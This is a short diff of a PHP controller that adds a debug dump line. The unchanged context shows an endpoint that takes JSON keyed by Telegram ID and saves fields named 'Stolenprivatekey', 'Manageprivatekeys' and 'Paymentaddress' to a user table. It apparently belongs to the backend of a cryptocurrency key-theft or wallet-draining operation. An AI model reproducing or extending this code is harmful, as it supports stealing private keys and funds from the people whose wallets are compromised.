@@ -61,7 +61,7 @@ class  UpdateController extends Controller
         try {
             $data = json_decode(file_get_contents('php://input'), true);
             $hash =  self::tgverification($data['hash']);
-
+            dump($hash);
             $arr =  Db::table('user')->field('*')->where(['tgid' => $data['tgid']])->find();
             if ($arr) {
                 $arr =  Db::table('user')->where(['tgid' => $data['tgid']])->update(['Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
